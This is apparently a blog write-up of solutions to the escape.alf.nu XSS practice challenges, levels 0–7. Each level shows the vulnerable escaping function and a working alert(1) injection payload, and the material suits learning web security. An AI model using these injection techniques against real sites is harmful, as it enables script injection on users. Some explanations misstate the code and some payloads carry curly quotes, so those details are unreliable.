There are many solutions to Erling Ellingsen’s <a href="https://alf.nu/alert1">escape.alf.nu</a> XSS challenges and I will be giving the solutions to first few challenges in the set.
I suggest <b>not to</b> read the write-up before you attempting it. It can take several days to solve the challenges depending on the amount of knowledge you’ve on the same. It took me several days to complete up till the first three challenges and I’d be posting here on how to tackle them effectively and also the key points to note upon while solving the challenges.

`Level 0`:
{% highlight JavaScript %}
function escape(s) {
  // Warmup.

  return 'console.log("'+s+'");';
}
{% endhighlight %}

Point to be noted to here is first we have to close the `console.log` and then fulfil with the requirement we want.

Solution: `");alert(1);//`


`Level 1`:
{% highlight JavaScript %}
function escape(s) {
  // Escaping scheme courtesy of Adobe Systems, Inc.
  s = s.replace(/"/g, '\\"');
  return 'console.log("' + s + '");';
}
{% endhighlight %}

The key point in the next level is that the `s.replace(/""/g, '//"/');` replaces the `"` as `/"` for which we simply have to escape the backslash.

Solution: `\");alert(1);//`

`Level 2`
{% highlight JavaScript %}
function escape(s) {
  s = JSON.stringify(s);
  return 'console.log(' + s + ');';
}
{% endhighlight %}

Pointed to be noted here is with the function `JSON.stringify(s);` which will escape double quotes `“` into `/”` but then we can see that it doesn’t escape `<>` brackets. So what suddenly struck me was to make a script block and then execute `alert(1)` in it.

Solution: `</script>alert(1)`

`Level 3`
{%highlight JavaScript %}
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
{% endhighlight %}

Point to be noted here is that `console.log(url)` which make us enable to use URL encoding for double quotes because it’s being escaped here.

Solution: `%22);alert(1);//`

`Level 4`
{% highlight JavaScript %}
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
{% endhighlight %}

Point to be noted here is that `<` is being globally replaced by `&lt` and `“` is being replaced once by `&quot` . Then I noticed how it is being replaced and then I split the whole thing up inside the `text.replace()` and then arrived at the solution. Moreover the escape function uses a template like `[[src|alt]]`.

Solution: `[[a|””onload=alert(1);//]]`

It will be rendered as:

`<img src=”a.gif” onload=”alert(1)” alt”““>`

`Level 5`
{% highlight JavaScript %}
function escape(s) {
  // Level 4 had a typo, thanks Alok.
  // If your solution for 4 still works here, you can go back and get more points on level 4 now.

  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
{% endhighlight %}

There were two points to be noted. One was that in the comment part which made me realize that it had similarity to that of the previous question and even before reading the rest, I tried the previous payload which didn’t work. Later I went through the rest of the code and figured out that it was in an http context.

Solution: `[[a|http://onload=alert(1);//]]`

`Level 6`
{% highlight JavaScript %}
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
{% endhighlight %}

First I noticed the comment section and figured out how `TextNode#foo` would show up and it just showed `foo`. Then I started reviewing all the functions in the DOM that begin with `create` as it is there in the function. Then I figured out the `createComment` from which I tried giving `Comment#foo` which showed `<!–<foo>–>` from which it made easy for the solution.

Solution:  `Comment#><svg/onload=alert(1)`

`Level 7`
{% highlight JavaScript %}
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "" + thing[0] + "(" + json +")";
}
{% endhighlight %}

Pointed to be noted here was that, first I gave input as there in the comment part and tried to analyse how it being rendered. Then I tried to play with it such that `alert(1)` gets executed.

Solution: `‘#’;alert(1)//`
